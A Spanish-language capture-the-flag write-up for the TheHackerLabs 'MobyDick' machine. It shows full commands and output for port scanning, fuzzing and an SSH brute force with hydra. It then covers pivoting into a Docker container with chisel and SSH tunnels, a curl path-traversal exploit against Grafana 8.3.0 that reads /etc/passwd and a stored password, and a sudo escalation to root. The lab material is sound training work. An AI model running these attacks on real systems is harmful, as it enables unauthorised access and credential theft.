---
title: "MobyDick - TheHackerLabs"
date: 2025-03-10
draft: false
slug: "THL-writeup-mobydick"
excerpt: "Una máquina no tan complicada, pero que necesita bastante trabajo resolverla. Después de ver el escaneo y no ver más que solo la página por defecto de Apache2, aplicamos Fuzzing, que descubre un archivo con un mensaje dirigido a un usuario, indicando que existe un contenedor de Docker que tiene activo Grafana 8.3.0 y un archivo de texto con una contraseña para una base de datos. Aplicamos fuerza bruta al usuario encontrado y logramos obtener su contraseña, con lo que entramos al servicio SSH. Dentro, encontramos un nuevo usuario y un archivo que es una base de datos de KeePass. Aplicando Ping Sweep con un script, encontramos la IP que está utilizando el contenedor de Docker. Aplicamos Port Forwarding de varías maneras, para poder ver la página de Grafana. Investigando la versión de Grafana usada, encontramos que tiene la vulnerabilidad Path Traversal, que aprovechamos para ver el archivo que contiene la contraseña de la base de datos de KeePass. Dentro de esa base de datos, encontramos la contraseña del otro usuario del SSH y al convertirnos en este, descubrimos que tiene todos los privilegios, así que podemos convertimos en Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "Docker", "Grafana", "Fuzzing", "Web Enumeration", "Brute Force Attack", "Port Forwarding", "Remote Port Forwarding", "Dynamic Port Forwarding", "Local Port Forwarding", "Path Traversal", "Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wfuzz"
  - "gobuster"
  - "hydra"
  - "ssh"
  - "ifconfig"
  - "bash"
  - "scp"
  - "chisel"
  - "gunzip"
  - "proxychains"
  - "proxy SOCKS"
  - "ssh"
  - "curl"
  - "cat"
  - "KeePass"
  - "sudo"
links:
  - "https://www.liquidweb.com/blog/what-is-grafana/"
  - "https://github.com/taythebot/CVE-2021-43798"
  - "https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p"
  - "https://github.com/jpillora/chisel"
  - "https://catonmat.net/tcp-port-scanner-in-bash"
  - "https://linuxconfig.org/bash-scripts-to-scan-and-monitor-network"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-mobydick/mobydick.webp"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.160
PING 192.168.1.160 (192.168.1.160) 56(84) bytes of data.
64 bytes from 192.168.1.160: icmp_seq=1 ttl=64 time=1.27 ms
64 bytes from 192.168.1.160: icmp_seq=2 ttl=64 time=0.909 ms
64 bytes from 192.168.1.160: icmp_seq=3 ttl=64 time=0.939 ms
64 bytes from 192.168.1.160: icmp_seq=4 ttl=64 time=0.888 ms

--- 192.168.1.160 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 0.888/1.002/1.273/0.157 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.160 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-10 18:51 CST
Initiating ARP Ping Scan at 18:51
Scanning 192.168.1.160 [1 port]
Completed ARP Ping Scan at 18:51, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:51
Scanning 192.168.1.160 [65535 ports]
Discovered open port 22/tcp on 192.168.1.160
Discovered open port 80/tcp on 192.168.1.160
Completed SYN Stealth Scan at 18:51, 40.55s elapsed (65535 total ports)
Nmap scan report for 192.168.1.160
Host is up, received arp-response (0.057s latency).
Scanned at 2025-03-10 18:51:05 CST for 40s
Not shown: 46274 filtered tcp ports (no-response), 19259 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 40.80 seconds
           Raw packets sent: 118201 (5.201MB) | Rcvd: 19264 (770.564KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente dos puertos abiertos, supongo que la intrusión será por la página web activa.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.1.160 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-10 18:52 CST
Nmap scan report for 192.168.1.160
Host is up (0.0012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 c7:64:98:df:39:82:71:73:53:42:0c:6a:57:84:c4:a8 (ECDSA)
|_  256 65:75:5f:51:98:3e:38:d4:46:e8:66:38:18:b2:79:dc (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))

|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Parece que la página web está mostrando la página por defecto de **Apache2**.

Si la revisamos, no encontraremos nada, por lo que será mejor aplicar **Fuzzing** para ver que podemos encontrar.

## Análisis de Vulnerabilidades {#Analisis}

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 400 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt-html-cgi-sh http://192.168.1.160/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.160/FUZZ.FUZ2Z
Total requests: 1102725

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000032621:   200        0 L      13 W       89 Ch       "penguin - php"                                                                                                              
000000003:   200        363 L    961 W      10671 Ch    "index - html"                                                                                                               
000226126:   403        9 L      28 W       279 Ch      "php"                                                                                                                        
000226128:   403        9 L      28 W       279 Ch      "html"                                                                                                                       

Total time: 0
Processed Requests: 1102725
Filtered Requests: 1102721
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*	     | Para indicar una busqueda de archivos específicos. |

Ahora probemos con **gobuster**:

```bash
gobuster dir -u http://192.168.1.160/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt,html.sh,cgi
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.160/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html.sh,cgi
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/penguin.php          (Status: 200) [Size: 89]
/.php                 (Status: 403) [Size: 279]
/.html.sh             (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 1102725 / 1102730 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar las extensiones de archivos especificas a buscar. |

Parece que solamente hay un archivo expuesto.

Vamos a verlo:

<p align="center">
<img src="/assets/images/THL-writeup-mobydick/Captura1.png">
</p>

Tenemos varios puntos ahí.

* Primero, podría ser que se dirige a un usuario llamado **pinguinito**.

* Segundo, nos está diciendo que están utilizando **Docker**.

* Tercero, está ocupando **Grafana 8.3.0**, al que podemos buscar un Exploit, ya que nos está dando la versión que están ocupando.

* Cuarto, hay un archivo que parece que contiene la contraseña de una base de datos, esto dentro del directorio `/tmp`.

Se me ocurre comprobar si ese usuario existe, aplicándole fuerza bruta junto al **servicio SSH**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta a Usuario pinguinito del Servicio SSH {#ssh}

Para hacerlo, ocuparemos la herramienta **hydra** y ocuparemos el wordlists nuclear **rockyou.txt**:
```bash
hydra -l 'pinguinito' -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.160:22 -t 48
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-10 19:45:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 48 tasks per 1 server, overall 48 tasks, 14344399 login tries (l:1/p:14344399), ~298842 tries per task
[DATA] attacking ssh://192.168.1.160:22/
[22][ssh] host: 192.168.1.160   login: pinguinito   password: love
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 18 final worker threads did not complete until end.
[ERROR] 18 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-10 19:46:28
```
Excelente, tenemos la contraseña.

Probémosla:
```bash
ssh pinguinito@192.168.1.160
pinguinito@192.168.1.160's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-100-generic x86_64)
...
...
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for enp0s3:  192.168.1.160
...
...
Last login: Tue Mar 11 01:48:33 2025
pinguinito@ballenasio:~$ whoami
pinguinito
```
Listo estamos dentro.

Lo malo, es que no podremos ver la flag del usuario, ya que solamente puede hacerlo el **usuario Root**.

Tenemos que escalar privilegios.

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima {#enumLin}

Si vemos el contenido del directorio `/home`, encontraremos 2 directorios:
```bash
pinguinito@ballenasio:~$ ls -la /home
total 16
drwxr-xr-x  4 root       root       4096 mar 12  2024 .
drwxr-xr-x 20 root       root       4096 mar 12  2024 ..
drwxr-x---  5 ballenasio ballenasio 4096 mar 12  2024 ballenasio
drwxr-x---  4 pinguinito pinguinito 4096 abr 16  2024 pinguinito
```
Ya estamos dentro de **pinguinito**, pero no podremos entrar al de **ballenasio** y que de seguro es otro usuario.

Además de encontrar la flag dentro de **pinguinito**, podemos encontrar un archivo que parece ser una base de datos de contraseñas de **KeePass**:
```bash
pinguinito@ballenasio:~$ ls -la
total 40
drwxr-x--- 4 pinguinito pinguinito 4096 abr 16  2024 .
drwxr-xr-x 4 root       root       4096 mar 12  2024 ..
-rw------- 1 pinguinito pinguinito 1262 abr 16  2024 .bash_history
-rw-r--r-- 1 pinguinito pinguinito  220 mar 12  2024 .bash_logout
-rw-r--r-- 1 pinguinito pinguinito 3771 mar 12  2024 .bashrc
drwx------ 2 pinguinito pinguinito 4096 mar 12  2024 .cache
-rw-rw-r-- 1 pinguinito pinguinito 2350 mar 12  2024 Database.kdbx
drwxrwxr-x 3 pinguinito pinguinito 4096 mar 12  2024 .local
-rw-r--r-- 1 pinguinito pinguinito  807 mar 12  2024 .profile
-r-------- 1 root       root         33 abr 16  2024 user.txt
```
Pero no podremos ni crackearlo, ni aplicarle un **volcado de memoria**, por lo que tenemos que hallar la forma de obtener la contraseña de acceso.

Vamos a descargarlo para más adelante:
```bash
scp pinguinito@192.168.1.160:/home/pinguinito/Database.kdbx .
pinguinito@192.168.1.160's password: 
Database.kdbx
```
Continuemos.

Si revisamos la interfaz, podemos ver la interfaz de **Docker**:
```bash
pinguinito@ballenasio:~$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 XX  prefixlen 64  scopeid 0x20<link>
        ether XX  txqueuelen 0  (Ethernet)
        RX packets 389  bytes 30042 (30.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 365  bytes 112744 (112.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
Normalmente, **Docker** va a utilizar el siguiente segmento si se crea un contenedor.

Aunque será mejor utilizar un script que aplique un **ping sweep** para descubrir IPs activas:

Puedes ocupar el siguiente:
```bash
#!/bin/bash

is_alive_ping()
{
  ping -c 1 $1 > /dev/null
  [ $? -eq 0 ] && echo Node with IP: $i is up.
}

for i in 172.17.0.{1..255} 
do
is_alive_ping $i & disown
done
```

Ejecútalo y observa el resultado:
```bash
pinguinito@ballenasio:~$ ./ips.sh 
Node with IP: 172.17.0.1 is up.
Node with IP: 172.17.0.2 is up.
```
Ahí está.

Ahora, veamos qué puertos tiene abiertos, utilizando el siguiente one-liner:
```bash
pinguinito@ballenasio:~$ for port in {1..65535}; do echo > /dev/tcp/172.17.0.2/$port && echo "Port: $port open"; done 2>/dev/null
Port: 3000 open
```
Tiene abierto el **puerto 3000**.

Investigando un poco, encontramos que **Grafana** ocupa el **puerto 3000** para operar:
* <a href="https://www.liquidweb.com/blog/what-is-grafana/" target="_blank">How to Install and Configure Grafana on Ubuntu 20.04</a>

Podemos utilizar **curl** para ver la página activa:
```bash
pinguinito@ballenasio:~$ curl http://172.17.0.2:3000
<a href="/login">Found</a>.
```
Parece ser un login.

Podríamos aplicar **Port Forwarding** para poder ver la página desde nuestro navegador.

### Aplicando Port Forwarding para Ver Login de Grafana {#pForwarding}

Tenemos varías formas que podemos utilizar para aplicar **Port Forwarding**. 

Vamos a ver algunas.

#### Aplicando Port Forwarding Remoto con chisel {#chisel}

Primero, vamos a descargar la herramienta **chisel**:
* <a href="https://github.com/jpillora/chisel" target="_blank">Repositorio de jpillora: chisel</a>

Una vez descargado, lo descomprimimos con **gunzip**:
```bash
gunzip chisel_1.10.1_linux_amd64.gz
.
mv chisel_1.10.1_linux_amd64 chisel
```

Y lo mandamos a la máquina víctima con **scp**:
```bash
scp chisel pinguinito@192.168.1.160:/home/pinguinito
pinguinito@192.168.1.160's password: 
chisel
```

Ahora, vamos a usar **chisel** en nuestra máquina para poder alzar un servidor con un puerto random:
```bash
./chisel server --reverse -p 1234
2025/03/10 20:28:12 server: Reverse tunnelling enabled
2025/03/10 20:28:12 server: Fingerprint Zn...
2025/03/10 20:28:12 server: Listening on http://0.0.0.0:1234
```

Dentro del **SSH**, utilizamos **chisel** como cliente para conectarnos a nuestro servidor y ahí aplicamos **Port Forwarding** para mostrar el **puerto 3000** en nuestro **puerto 3000** de nuestra máquina:
```bash
pinguinito@ballenasio:~$ ./chisel client Tu_IP:1234 R:3000:172.17.0.2:3000
2025/03/11 02:29:07 client: Connecting to ws://Tu_IP:1234
2025/03/11 02:29:07 client: Connected (Latency 1.595801ms)
```
Listo.

Ahora, podemos visitar la página de **Grafana** en `localhost:3000`:

<p align="center">
<img src="/assets/images/THL-writeup-mobydick/Captura2.png">
</p>

Ahí está.

#### Aplicando Port Forwarding Dinámico con Proxy SOCKS y proxychains {#proxychains}

Para utilizar los **proxychains**, necesitamos crear un túnel dinámico desde el **servicio SSH**, usando un **proxy SOCKS**.

Para hacer esto, debemos indicarle un puerto que será usado para el **proxy SOCKS** (**-D**) y podemos indicarle que no abra una shell interactiva (**-N**):
```bash
ssh -D 9050 -N pinguinito@192.168.1.160
pinguinito@192.168.1.160's password:
```

Configuramos los **proxychains**, añadiendo el puerto que ocupamos en el paso anterior. En mi caso, tengo configurado **proxychains4** que ocupa **SOCKS4**:
```bash
nano /etc/proxychains4.conf
-----------
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050
```

Con esto, ya podremos ejecutar comandos al **servicio SSH** utilizando **proxychains**. Por ejemplo, podemos aplicarle un escaneo al **puerto 3000** del contenedor:
```bash
proxychains -q nmap -sCV -p 3000 -Pn -sT 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-10 21:54 CST
Nmap scan report for 172.17.0.2
Host is up (0.0019s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  http    Grafana http

| http-title: Grafana
|_Requested resource was /login
| http-robots.txt: 1 disallowed entry 
|_/
|_http-trane-info: Problem with XML parsing of /evox/about

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.91 seconds
```
Ahí está el **servicio Grafana**.

Bien, para poder ver la página, debemos agregar el proxy al (en caso de que lo tengas) **FoxyProxy**:

<p align="center">
<img src="/assets/images/THL-writeup-mobydick/Captura3.png">
</p>

Una vez agregado, podemos visitar la página desde nuestro navegador:

<p align="center">
<img src="/assets/images/THL-writeup-mobydick/Captura4.png">
</p>

Genial, otra forma en que aplicamos **Port Forwarding** conocido como **Port Forwarding Dinámico**.

#### Aplicando Port Forwarding Local con SSH {#PFlocalSSH}

Esta es una forma bastante sencilla, tan solo hay que indicarle que un puerto que ocuparemos en nuestra máquina, la IP del **SSH** y luego el puerto que queremos exponer.

Pero, como es un puerto de un contenedor el que queremos exponer, vamos a indicarle la IP del contenedor:
```bash
ssh -L 8080:172.17.0.2:3000 pinguinito@192.168.1.160 -N
pinguinito@192.168.1.160's password:
```
Listo, eso era todo.

Visitemos la página web en el **puerto 8080**:

<p align="center">
<img src="/assets/images/THL-writeup-mobydick/Captura5.png">
</p>

Ahí está, con esto terminamos de aplicar **Port Forwarding Local**.

### Aplicando Path Traversal a Grafana 8.3.0 y Escalando Privilegios con Contraseña Almacenada en Base de Datos de KeePass {#PathT}

Si recordamos, tenemos la versión que están ocupando de **Grafana** siendo la **8.3.0**.

Esta versión es vulnerable a **Path Traversal**, pero ¿qué es un **Path Traversal**?

| **Path Traversal** |
|:-----------:|
| *Un Path Traversal (o Directory Traversal) es una vulnerabilidad que permite a un atacante acceder a archivos y directorios fuera del directorio raíz permitido en un servidor. Esto ocurre cuando una aplicación no valida correctamente las rutas de los archivos que maneja.* |

Aquí puedes ver un Exploit creado en **Go**, pero lo que nos interesa, es la forma en la que aplica el **Path Traversal con curl**:
* <a href="https://github.com/taythebot/CVE-2021-43798" target="_blank">Repositorio de taythebot: CVE-2021-43798</a>

Apliquemos el **Path Traversal con curl**:
```bash
curl --path-as-is http://localhost:8080/public/plugins/alertlist/../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
grafana:x:472:0::/home/grafana:/usr/sbin/nologin
```
Funciona.

Recordando un poco, al descubrir y ver un archivo de **PHP** de la página principal, nos indica que hay un archivo de texto dentro del directorio `/tmp` que contiene la contraseña de una base de datos.

Supongamos que dicho archivo, está dentro del contenedor.

Veamos si existe:
```bash
curl --path-as-is http://localhost:8080/public/plugins/alertlist/../../../../../../../../tmp/database_pass.txt
supermegas...
```
Tenemos la contraseña.

Vamos a probar si esta contraseña funciona con la base de datos de **KeePass** que encontramos antes:

<p align="center">
<img src="/assets/images/THL-writeup-mobydick/Captura6.png">
</p>

Tenemos la contraseña del **usuario ballenasio**.

Vamos a probarla:
```bash
pinguinito@ballenasio:~$ su ballenasio
Password: 
ballenasio@ballenasio:/home/pinguinito$ whoami
ballenasio
```

Genial, y si revisamos los privilegios de este usuario, resulta que tiene todos:
```bash
ballenasio@ballenasio:~$ sudo -l
[sudo] password for ballenasio: 
Matching Defaults entries for ballenasio on ballenasio:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
.
User ballenasio may run the following commands on ballenasio:
    (ALL : ALL) ALL
```

Entonces, podemos convertirnos en **Root**:
```bash
ballenasio@ballenasio:~$ sudo su
root@ballenasio:/home/ballenasio# whoami
root
```

Y ya solo buscamos las flags:
```bash
root@ballenasio:/home/ballenasio# cd /home/pinguinito/
root@ballenasio:/home/pinguinito# cat user.txt
...
root@ballenasio:/home/pinguinito# cd /root
root@ballenasio:~# cat root.txt
...
```
Con esto terminamos la máquina.
